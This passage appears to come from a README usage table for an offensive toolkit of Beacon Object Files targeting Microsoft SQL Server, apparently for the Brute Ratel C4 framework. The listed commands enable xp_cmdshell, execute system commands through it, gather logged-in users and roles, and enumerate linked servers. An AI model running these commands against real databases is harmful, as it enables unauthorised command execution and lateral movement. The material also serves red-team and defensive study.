...
|coffexec /~/MSSQL-BOF-BRC4/SQL/enableXpcmd/enableXpcmd.x64.o 1 win1\sqlexpress|[new Value for xp_cmdshell][server][opt: link]|Change value of xp_cmdshell|
...
|coffexec /~/MSSQL-BOF-BRC4/SQL/whoami/whoami.x64.o win1\sqlexpress|[server][opt: link]|Gather logged in user, mapped user and roles|
|coffexec /~/MSSQL-BOF-BRC4/SQL/xpcmd/xpcmd.x64.o "hostname && whoami" win1\sqlexpress|[command][server][opt: link]|Execute a system command via xp_cmdshell|
|coffexec /~/MSSQL-BOF-BRC4/SQL/links/links.x64.o win1\sqlexpress|[server]|Enumerate linked servers|
